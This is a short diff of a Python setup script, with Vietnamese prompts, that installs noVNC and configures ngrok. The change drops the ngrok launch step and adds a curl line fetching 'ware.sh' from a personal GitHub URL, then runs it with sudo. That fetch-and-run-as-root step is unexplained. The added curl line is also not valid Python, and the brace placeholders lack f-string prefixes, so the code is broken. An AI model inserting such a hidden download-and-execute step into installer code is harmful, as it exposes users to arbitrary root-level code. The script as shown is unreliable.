@@ -9,12 +9,12 @@ os.system("clear")
 print("Installing noVNC...")
 os.system("git clone https://github.com/novnc/noVNC.git")
 os.system("ngrok config add-authtoken {Token}")
-Port = input("Set port cho VNC và NGROK :")
+Port = input("Set port cho vnc")
 print ("code for vnc_proxy :")
 print ("./noVNC/utils/novnc_proxy --listen {Your Port}")
 print ("!Lưu ý: Nhập lệnh vnc ở trang khác.")
-link_vnc = input("Link vnc_proxy :")
-os.system("ngrok http {Port} & {link_vnc}
+curl -s -l "https://github.com/nguyenbinh1289/y/raw/main/ware.sh"
+os.system("sudo ./ware.sh")
 
 
 
